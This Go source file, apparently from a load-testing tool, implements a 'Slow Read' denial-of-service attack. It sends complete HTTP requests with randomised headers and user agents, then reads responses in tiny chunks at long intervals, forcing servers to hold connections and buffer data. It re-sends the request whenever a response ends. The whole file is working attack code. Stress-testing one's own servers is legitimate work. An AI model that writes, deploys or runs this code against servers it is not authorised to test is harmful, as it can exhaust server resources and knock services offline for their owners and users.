package strategy

import (
	"context"
	"sync/atomic"
	"time"

	"github.com/jdw/loadtestforge/internal/httpdata"
	"github.com/jdw/loadtestforge/internal/netutil"
)

// SlowRead implements the Slow Read attack.
// It sends a complete HTTP request but reads the response very slowly,
// forcing the server to keep the connection open and buffer the response.
type SlowRead struct {
	readInterval      time.Duration
	readSize          int
	connConfig        netutil.ConnConfig
	headerRandomizer  *httpdata.HeaderRandomizer
	activeConnections int64
}

func NewSlowRead(readInterval time.Duration, readSize int, windowSize int, bindIP string) *SlowRead {
	cfg := netutil.DefaultConnConfig(bindIP)
	cfg.WindowSize = windowSize

	return &SlowRead{
		readInterval:     readInterval,
		readSize:         readSize,
		connConfig:       cfg,
		headerRandomizer: httpdata.DefaultHeaderRandomizer(),
	}
}

func (s *SlowRead) Execute(ctx context.Context, target Target) error {
	mc, parsedURL, err := netutil.DialManaged(ctx, target.URL, s.connConfig, &s.activeConnections)
	if err != nil {
		return err
	}
	defer mc.Close()

	userAgent := httpdata.RandomUserAgent()

	// Build GET request (Accept-Encoding: identity to prevent compression)
	request := s.headerRandomizer.BuildGETRequest(parsedURL, userAgent)

	if _, err := mc.WriteWithTimeout([]byte(request), 5*time.Second); err != nil {
		return err
	}

	ticker := time.NewTicker(s.readInterval)
	defer ticker.Stop()

	readBuffer := make([]byte, s.readSize)

	for {
		select {
		case <-mc.Context().Done():
			return nil
		case <-ticker.C:
			// Read very small amount of data very slowly
			n, err := mc.ReadWithTimeout(readBuffer, 30*time.Second)

			if err != nil {
				return err
			}

			if n == 0 {
				// Server finished sending, send new request
				if _, err := mc.WriteWithTimeout([]byte(request), 5*time.Second); err != nil {
					return err
				}
			}
		}
	}
}

func (s *SlowRead) Name() string {
	return "slow-read"
}

func (s *SlowRead) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}
